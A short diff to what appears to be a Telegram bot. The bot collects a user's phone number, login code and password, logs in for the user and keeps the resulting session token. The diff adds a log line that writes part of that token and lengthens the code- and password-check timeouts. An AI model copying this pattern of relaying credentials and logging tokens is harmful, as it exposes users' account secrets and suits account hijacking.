@@ -100,6 +100,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
             pending[uid]["token"] = client.token
             pending[uid]["user_id"] = client.my_id
             pending[uid]["status"] = "done"
+            logging.info(f"Токен сохранён: {client.token[:20]}...")
         except Exception as e:
             error = str(e).lower()
             logging.error(f"Ошибка авторизации: {e}")
@@ -135,7 +136,7 @@ async def code_handler(message: types.Message, state: FSMContext):
     
     msg = await message.answer("⏳ Проверяю код...")
     
-    for _ in range(60):
+    for _ in range(240):
         await asyncio.sleep(0.5)
         status = pending[uid].get("status", "")
         
@@ -203,7 +204,7 @@ async def password_handler(message: types.Message, state: FSMContext):
     
     msg = await message.answer("⏳ Проверяю пароль...")
     
-    for _ in range(60):
+    for _ in range(240):
         await asyncio.sleep(0.5)
         status = pending[uid].get("status", "")
         
